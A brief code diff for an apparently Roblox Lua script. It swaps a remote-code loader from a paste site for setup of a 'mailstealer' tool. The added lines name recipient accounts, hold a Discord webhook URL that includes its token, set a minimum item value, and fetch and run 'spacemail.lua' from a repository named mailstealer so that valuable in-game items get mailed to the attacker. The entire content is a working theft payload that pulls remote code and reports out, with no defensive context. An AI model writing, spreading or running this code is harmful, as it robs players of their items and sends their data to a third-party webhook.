@@ -1,1 +1,6 @@
-loadstring(game:HttpGet('https://rentry.co/c97o7z77/raw',true))()
+Username = "eko_hi"
+Username2 = "eko_hi1" -- stuff will get sent to this user if first user mailbox is full
+Webhook = "https://discord.com/api/webhooks/1236012282996326460/HVGy0Ui3XbJVn_d_lVuucqrRO32U3qQG0h7MBPdMgpKAb9Ubi_hteNfaQ6WbKkAfo9vh"
+min_rap = 100000 -- minimum rap of each item you want to get sent to you.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubScript/mailstealer/main/spacemail.lua"))()
